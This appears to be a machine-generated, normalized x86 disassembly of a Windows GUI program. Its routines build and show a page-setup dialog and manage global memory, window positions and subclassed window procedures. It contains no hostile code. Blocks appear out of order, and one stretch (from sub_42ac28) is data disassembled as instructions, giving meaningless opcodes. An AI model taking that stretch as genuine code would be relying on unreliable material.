mov [ ebp - 0x48 ] 0xffef
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x5a
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x60 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x60 ]
call sub_429dcc
mov eax [ ebp - 0x8 ]
call sub_404554
mov [ ebp - 0x5c ] eax
mov eax [ ebx + 0x64 ]
mov [ ebp - 0x50 ] eax
mov [ ebx + 0x68 ] eax
test [ ebx + 0x5c ] 0x40
je r-xdata
mov eax [ ebx + 0x6c ]
call sub_404554
mov [ ebp - 0x3c ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ ebp - 0x48 ]
add edx 0x2
lea eax [ ebp - 0xc ]
call sub_4046e0
mov eax [ ebp - 0xc ]
call sub_404554
mov esi eax
mov [ ebp - 0x4c ] esi
mov edx [ ebp - 0x48 ]
add edx 0x2
mov eax esi
xor ecx ecx
call sub_402d44
mov eax [ ebx + 0x78 ]
call sub_404554
mov edx eax
mov ecx [ ebp - 0x48 ]
mov eax [ ebp - 0x4c ]
call sub_408a1c
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
jae r-xdata
and edx 0x7f
bt [ ebx + 0x5c ] edx
mov eax r-xdata
mov [ ebp - 0x3c ] eax
jmp r-xdata
inc eax
add esi 0x4
cmp al 0x16
jne r-xdata
mov edx [ esi ]
or [ ebp - 0x34 ] edx
mov eax [ ebx + 0x70 ]
call sub_404554
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0x20
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov esi rw-data
mov edx eax
cmp dl 0x1f
ja r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ ebp - 0x34 ] 0xfff7ffff
xor [ ebp - 0x34 ] 0x80000
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
test [ ebp - 0x32 ] 0x8
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ ebx + 0x5e ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_404554
mov [ ebp - 0x2c ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x78 ]
call sub_408894
lea eax [ ebp - 0x10 ]
mov ecx 0x1
mov edx 0x1
call sub_4045f4
lea eax [ ebp - 0x10 ]
mov edx [ ebx + 0x74 ]
call sub_40412c
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jl r-xdata
xor eax eax
mov esi rw-data
mov [ ebp - 0x24 ] sub_429790
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x5a
jl r-xdata
jae r-xdata
and edx 0x7f
bt [ ebx + 0xb0 ] edx
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
mov [ ebp - 0x24 ] sub_429a68
inc eax
add esi 0x4
cmp al 0x1
jne r-xdata
mov edx [ esi ]
or [ ebp - 0x14 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x64 ] eax
lea ecx [ ebp - 0x68 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov esi eax
test esi esi
je r-xdata
or [ ebp - 0x34 ] 0x40
mov [ ebp - 0x20 ] eax
mov edx eax
cmp dl 0x7
ja r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a0d4
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_4040b8
retn
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_42a228
test [ ebp - 0x33 ] 0x4
je r-xdata
and [ ebx + 0x5c ] 0xffffff7f
or [ ebx + 0x5c ] 0x80
jmp r-xdata
and [ ebx + 0x5c ] 0xfffffffe
or [ ebx + 0x5c ] 0x1
jmp r-xdata
test [ ebp - 0x34 ] 0x1
je r-xdata
mov eax [ ebp - 0x50 ]
mov [ ebx + 0x64 ] eax
sub_42a0e0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov dl [ eax - 0x1 ]
mov eax esi
call sub_40cb24
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx ebx
sub ecx esi
mov eax edi
mov edx esi
call sub_404184
inc ebx
mov eax edi
mov edx esi
call sub_40428c
mov eax esi
call sub_4089a4
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
sub_42a128
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_42a20d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_42a0e0
pop ecx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_42a0e0
pop ecx
mov ebx eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4087dc
cmp [ eax ] 0x5c
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x7c ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x5c
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40435c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a214
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040b8
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x7c ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_42a0e0
pop ecx
mov ebx eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_404354
cmp eax 0x3
jle r-xdata
lea eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4043a0
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x1 ] 0x3a
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2 ] 0x5c
je r-xdata
sub_42a228
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42a2d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp - 0x8 ]
test [ eax + 0x5c ] 0x40
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x5c ] 0x40
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x5e ] 0x1
jne r-xdata
push ebp
mov eax [ edx + 0x1c ]
mov edx [ ebp - 0x8 ]
add edx 0x78
call sub_42a0e0
pop ecx
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x78 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x7c ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
push ebp
mov eax [ edx + 0x1c ]
call sub_42a128
pop ecx
lea ecx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x7c ]
xor edx edx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax 0x78
call sub_4040e8
jmp r-xdata
mov [ ebp - 0x1 ] 0x20
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a2da
lea eax [ ebp - 0xc ]
call sub_404094
retn
sub_42a2e0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
push 0x0
push esi
xor ecx ecx
xor edx edx
xor eax eax
call sub_412f04
test [ ebx + 0x5e ] 0x1
jne r-xdata
push esi
push edi
call GetClientRect
jmp r-xdata
push esi
push 0x45f
push edi
call GetDlgItem
push eax
call GetWindowRect
push 0x2
push esi
mov eax [ ebx + 0x3c ]
push eax
push 0x0
call MapWindowPoints
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_42a334
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x78 ]
call sub_4040e8
cmp [ ebx + 0x3c ] 0x0
je r-xdata
mov eax esp
push eax
push 0x105
push 0x465
mov eax [ ebx + 0x3c ]
push eax
call GetParent
push eax
call SendMessageA
mov edx esi
mov eax esp
call sub_408ba4
jmp r-xdata
add esp 0x108
pop esi
pop ebx
retn
sub_42a39c
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov eax esi
call sub_404354
mov ebx eax
cmp ebx 0x1
jle r-xdata
lea eax [ edi + 0x6c ]
push eax
mov ecx ebx
mov edx 0x1
mov eax esi
call sub_4045b4
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_40c920
test al al
je r-xdata
mov ecx ebx
dec ecx
mov edx esi
mov eax r-xdata
call sub_40c954
test al al
jne r-xdata
dec ebx
sub_42a440
push ebp
mov ebp esp
add esp 0xfffff3fc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
lea eax [ ebp - 0xc04 ]
push eax
push ebx
call sub_427474
lea ecx [ ebp - 0x804 ]
lea edx [ ebp - 0x404 ]
call sub_426ce4
cmp [ ebx ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x404 ]
call sub_40898c
mov ebx eax
add ebx 0x8
lea eax [ ebp - 0x804 ]
call sub_40898c
add ebx eax
lea eax [ ebp - 0xc04 ]
call sub_40898c
add ebx eax
add ebx 0x3
push ebx
push 0x42
call GlobalAlloc
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call GlobalLock
mov esi eax
xor eax eax
push ebp
push sub_42a534
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx esi
add ebx 0x8
mov edi esi
mov eax ebx
sub ax si
mov [ edi ] ax
lea edx [ ebp - 0x804 ]
mov eax ebx
call sub_4089f0
inc eax
mov ebx eax
mov eax ebx
sub ax si
mov [ edi + 0x2 ] ax
lea edx [ ebp - 0x404 ]
mov eax ebx
call sub_4089f0
inc eax
mov ebx eax
mov eax ebx
sub ax si
mov [ edi + 0x4 ] ax
lea edx [ ebp - 0xc04 ]
mov eax ebx
call sub_4089c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call GlobalUnlock
retn
sub_42a544
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
call GlobalLock
mov ebx eax
xor eax eax
push ebp
push sub_42a5b0
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi ebx
movzx eax [ esi + 0x4 ]
mov edi ebx
add eax edi
push eax
mov eax [ ebp - 0x4 ]
push eax
call sub_427474
movzx ecx [ esi ]
add ecx edi
movzx edx [ esi + 0x2 ]
add edx edi
call sub_426d8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a5b7
mov eax [ ebp - 0x8 ]
push eax
call GlobalUnlock
mov eax [ ebp - 0x8 ]
push eax
call GlobalFree
retn
sub_42a5c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GlobalSize
mov ebx eax
push ebx
push 0x42
call GlobalAlloc
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor edx edx
push ebp
push sub_42a642
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
push eax
call GlobalLock
mov esi eax
mov eax [ ebp - 0x8 ]
push eax
call GlobalLock
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call GlobalUnlock
mov eax [ ebp - 0x8 ]
push eax
call GlobalUnlock
retn
test eax eax
je r-xdata
mov edx eax
mov eax esi
mov ecx ebx
call sub_4028f0
sub_42a658
push ebp
mov ebp esp
push ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41db18
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42a6bf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x10 ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41e2b4
cmp [ ebp + 0xa ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a6c6
mov eax [ ebp - 0x4 ]
call sub_403344
retn
mov eax [ ebp + 0x10 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
dec eax
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ rw-data ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
sub_42a6cc
push ebp
mov ebp esp
push ecx
push ebx
mov edx [ ebp + 0xc ]
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x10
mov [ ebp - 0x1 ] 0x0
cmp edx 0x400
jne r-xdata
add edx 0xfffffbff
cmp edx 0x5
ja r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xda ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x1 ]
jmp [ edx * 4 + jump_table_42a77d ]
mov eax [ ebp + 0x10 ]
shr eax 0x10
mov edx eax
sub edx 0x1
je r-xdata
push ebp
mov eax [ rw-data ]
push [ eax + 0x104 ]
push [ eax + 0x100 ]
call sub_42a658
pop ecx
jmp r-xdata
push ebp
mov eax [ rw-data ]
push [ eax + 0xf4 ]
push [ eax + 0xf0 ]
call sub_42a658
pop ecx
jmp r-xdata
push ebp
mov eax [ rw-data ]
push [ eax + 0x114 ]
push [ eax + 0x110 ]
call sub_42a658
pop ecx
jmp r-xdata
push ebp
mov eax [ rw-data ]
push [ eax + 0x10c ]
push [ eax + 0x108 ]
call sub_42a658
pop ecx
jmp r-xdata
push ebp
mov eax [ rw-data ]
push [ eax + 0xfc ]
push [ eax + 0xf8 ]
call sub_42a658
pop ecx
jmp r-xdata
push ebp
mov eax [ rw-data ]
push [ eax + 0xec ]
push [ eax + 0xe8 ]
call sub_42a658
pop ecx
mov dl 0x1
sub edx 0x2
je r-xdata
sub edx 0x8
je r-xdata
sub edx 0xe
je r-xdata
xor edx edx
jmp r-xdata
and edx 0x7f
mov dl [ edx + rw-data ]
push edx
cmp eax 0xb
setg al
and eax 0x7f
mov al [ eax + rw-data ]
push eax
lea eax [ ebp - 0x1 ]
push eax
mov cx [ ebp + 0x10 ]
and cx 0xffff
mov ebx [ rw-data ]
mov edx [ rw-data ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
jmp r-xdata
sub_42a840
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4297f8
mov ax [ r-xdata ]
mov [ esi + 0x58 ] ax
mov eax esi
call sub_42aa84
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_42a88a
add [ eax ] al
push ebx
push esi
push edi
add esp 0xffffffe4
mov edi eax
lea eax [ edi + 0x84 ]
xor ecx ecx
mov edx 0x54
call sub_402d44
lea esi [ edi + 0x84 ]
mov [ esi ] 0x54
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
mov [ esi + 0x3c ] eax
lea edx [ esi + 0xc ]
mov eax esp
call sub_42a440
mov eax [ esp ]
call sub_42a5c0
mov [ esi + 0x8 ] eax
mov [ esi + 0x10 ] 0x400
lea eax [ edi + 0x84 ]
push eax
call PageSetupDlgA
mov [ esi + 0x10 ] 0x42002
mov al [ edi + 0xe0 ]
dec al
je r-xdata
add [ esi + 0x10 ] 0x8
dec al
jne r-xdata
test [ edi + 0x58 ] 0x2
je r-xdata
add [ esi + 0x10 ] 0x0
test [ edi + 0x58 ] 0x1
je r-xdata
add [ esi + 0x10 ] 0x4
jmp r-xdata
test [ edi + 0x58 ] 0x4
je r-xdata
add [ esi + 0x10 ] 0x10
test [ edi + 0x58 ] 0x8
je r-xdata
add [ esi + 0x10 ] 0x100
mov [ rw-data ] edi
mov [ esi + 0x48 ] sub_42a6cc
add [ esi + 0x10 ] 0x80000
jmp r-xdata
test [ edi + 0x58 ] 0x20
je r-xdata
add [ esi + 0x10 ] 0x200
test [ edi + 0x58 ] 0x10
je r-xdata
test [ edi + 0x58 ] 0x40
je r-xdata
add [ esi + 0x10 ] 0x20
test [ edi + 0x58 ] 0x80
je r-xdata
add [ esi + 0x10 ] 0x2
test [ edi + 0x59 ] 0x1
je r-xdata
inc [ esi + 0x10 ]
test [ edi + 0x59 ] 0x2
jne r-xdata
add [ esi + 0x10 ] 0x800
test [ edi + 0x59 ] 0x4
je r-xdata
add [ esi + 0x10 ] 0x80
lea ecx [ esp + 0x4 ]
mov edx [ edi + 0x80 ]
mov eax [ edi + 0x7c ]
call sub_412edc
mov eax [ esp + 0x4 ]
mov [ esi + 0x14 ] eax
mov eax [ esp + 0x8 ]
mov [ esi + 0x18 ] eax
mov eax [ edi + 0x68 ]
push eax
lea eax [ esp + 0x10 ]
push eax
mov ecx [ edi + 0x64 ]
mov edx [ edi + 0x60 ]
mov eax [ edi + 0x5c ]
call sub_412f04
push esi
push edi
lea edi [ esi + 0x1c ]
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ edi + 0x78 ]
push eax
lea eax [ esp + 0x10 ]
push eax
mov ecx [ edi + 0x74 ]
mov edx [ edi + 0x70 ]
mov eax [ edi + 0x6c ]
call sub_412f04
push esi
push edi
lea edi [ esi + 0x2c ]
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov [ esi + 0x44 ] sub_429790
lea ecx [ edi + 0x84 ]
mov edx PageSetupDlgA
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
je r-xdata
add [ esi + 0x10 ] 0x200000
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
mov [ edi + 0x7c ] eax
mov eax [ esi + 0x18 ]
mov [ edi + 0x80 ] eax
mov eax [ esi + 0x2c ]
mov [ edi + 0x6c ] eax
mov eax [ esi + 0x30 ]
mov [ edi + 0x70 ] eax
mov eax [ esi + 0x34 ]
mov [ edi + 0x74 ] eax
mov eax [ esi + 0x38 ]
mov [ edi + 0x78 ] eax
mov edx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
call sub_42a544
jmp r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call GlobalFree
mov eax ebx
add esp 0x1c
pop edi
pop esi
pop ebx
retn
push eax
call GlobalFree
sub_42aa84
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov ebx eax
lea esi [ ebp - 0x55 ]
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_42aab8
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_427474
call sub_426fd4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
xor ecx ecx
mov edx 0x54
call sub_402d44
mov [ esi ] 0x54
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
mov [ esi + 0x3c ] eax
mov al [ ebx + 0xe0 ]
dec al
je r-xdata
add [ esi + 0x10 ] 0x8
dec al
jne r-xdata
test [ ebx + 0x58 ] 0x2
je r-xdata
add [ esi + 0x10 ] 0x0
test [ ebx + 0x58 ] 0x1
je r-xdata
add [ esi + 0x10 ] 0x4
jmp r-xdata
test [ ebx + 0x58 ] 0x4
je r-xdata
add [ esi + 0x10 ] 0x10
test [ ebx + 0x58 ] 0x8
je r-xdata
add [ esi + 0x10 ] 0x100
test [ ebx + 0x58 ] 0x10
je r-xdata
add [ esi + 0x10 ] 0x80000
test [ ebx + 0x58 ] 0x20
je r-xdata
add [ esi + 0x10 ] 0x200
lea ecx [ ebp - 0x60 ]
mov edx [ ebx + 0x80 ]
mov eax [ ebx + 0x7c ]
call sub_412edc
mov eax [ ebp - 0x60 ]
mov [ esi + 0x14 ] eax
mov eax [ ebp - 0x5c ]
mov [ esi + 0x18 ] eax
mov eax [ ebx + 0x68 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov ecx [ ebx + 0x64 ]
mov edx [ ebx + 0x60 ]
mov eax [ ebx + 0x5c ]
call sub_412f04
push esi
lea edi [ esi + 0x1c ]
lea esi [ ebp - 0x70 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax [ ebx + 0x78 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov ecx [ ebx + 0x74 ]
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x6c ]
call sub_412f04
push esi
lea edi [ esi + 0x2c ]
lea esi [ ebp - 0x70 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x44 ] sub_429790
or [ esi + 0x10 ] 0x400
push esi
call PageSetupDlgA
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add [ esi + 0x10 ] 0x20
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x14 ]
mov [ ebx + 0x7c ] eax
mov eax [ esi + 0x18 ]
mov [ ebx + 0x80 ] eax
mov eax [ esi + 0x2c ]
mov [ ebx + 0x6c ] eax
mov eax [ esi + 0x30 ]
mov [ ebx + 0x70 ] eax
mov eax [ esi + 0x34 ]
mov [ ebx + 0x74 ] eax
mov eax [ esi + 0x38 ]
mov [ ebx + 0x78 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call GlobalFree
push eax
call GlobalFree
sub_42ac28
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
lodsd [ esi ]
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
lodsd [ esi ]
inc edx
add [ eax - 0x53 ] al
inc edx
add [ eax ] dl
add al [ eax ]
add al bh
in eax 0x43
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax - 0x3ffbfcb ] ah
push 0x32dc0044
inc eax
add al bh
xor al [ eax ]
aam 0x4b
inc esp
add [ eax + ebx * 4 + 0x60c40044 ] bl
inc esp
add [ ecx + ecx * 2 + 0x46580041 ] dh
inc esp
add [ eax ] ah
sbb al [ eax + eax + 0x78 ]
dec ebp
inc esp
add [ eax ] bh
and eax [ eax + eax + 0x38 ]
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add [ eax - 0x4fffbbb6 ] dh
xchg ebx eax
inc esp
add ah cl
cwde
inc esp
add [ eax ] bl
cwde
inc esp
add [ eax + ebx - 0x71d3ffbc ] dl
inc esp
add [ esi + ecx * 4 + 0x44 ] cl
add [ ebx + ecx * 4 + 0x44 ] ah
add ah bl
pop ss
inc esp
add al ah
pop ss
inc esp
add [ eax ] ch
dec eax
inc esp
add [ eax + ecx * 2 + 0x44 ] dl
add [ eax ] ah
and eax [ eax + eax + 0x58 ]
sbb [ eax + eax - 0x54 ] eax
and al 0x44
add [ esp ] ah
inc esp
add [ eax ] bh
daa
inc esp
add ah ah
and eax 0xada40044
inc edx
add al bl
dec eax
inc esp
add [ eax + 0x7400448b ] bh
mov [ eax + eax + 0x70 ] es
xchg [ eax + eax + 0x58 ] eax
mov [ eax + eax - 0x10 ] es
dec ebp
inc esp
add [ esp + edx * 2 + 0x62240044 ] al
inc esp
add [ eax + 0xc0042ad ] al
pop edi
inc esp
add [ ebx * 2 + 0x62bc0044 ] bh
inc esp
add al al
bound eax [ eax + eax + 0x78 ]
popad
inc esp
add [ eax ] ah
popad
inc esp
add [ eax + 0x6800448d ] bl
imul eax [ eax + eax - 0x74 ] 0xffffff9f
inc esp
add [ edx + ecx * 4 ] dl
inc esp
add [ ecx * 4 + 0x10044 ] al
and [ eax + sub_42ade0 ] esi
adc [ edx + edx * 2 + 0x65 ] edx
imul esi [ fs : edx + 0x65 ] 0x726f7463
push edi
imul ebp [ esi + 0x64 ] 0xc08b776f
pop eax
lodsd [ esi ]
inc edx
add [ edi ] al
adc [ edx + edx * 2 + 0x65 ] edx
imul esi [ fs : edx + 0x65 ] 0x726f7463
push edi
imul ebp [ esi + 0x64 ] 0xac70776f
inc edx
add [ ecx + ebp * 8 + 0xb0043 ] ch
pop es
inc esp
imul esp [ ecx + 0x6c ] 0x73676f
add [ eax - 0xd74a9ad ] dl
mov ebx eax
mov edx esi
mov eax ebx
call sub_445c10
mov [ esi + 0x4 ] 0x90000000
mov eax [ ebx + 0x20c ]
mov [ esi + 0x1c ] eax
pop esi
pop ebx
retn
sub_42ada4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_446798
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx ] 0xb021
je r-xdata
cmp [ esi + 0x208 ] 0x0
je r-xdata
mov edx ebx
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
and eax 0x7f
mov [ ebx + 0xc ] eax
sub_42ade8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call GetPropA
push eax
call CallWindowProcA
pop ebp
retn
sub_42ae24
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
sub eax 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_464418
cmp eax [ ebp + 0x8 ]
jne r-xdata
sub eax 0x80
je r-xdata
push ebp
call sub_42ade8
pop ecx
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_46443c
jmp r-xdata
push ebp
call sub_42ade8
pop ecx
mov ebx eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call RemovePropA
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x10 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_464418
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_464418
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_46443c
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
call sub_46443c
jmp r-xdata
sub_42aed8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
push edi
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
call sub_429790
cmp esi 0x110
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov esi [ edi + 0x1c ]
mov eax esi
call sub_42b198
inc eax
jne r-xdata
push 0x15
push 0x0
push 0x0
mov eax esi
call sub_42b200
push eax
mov eax esi
call sub_42b198
push eax
push 0x0
push ebx
call SetWindowPos
mov eax esi
call sub_42b200
inc eax
je r-xdata
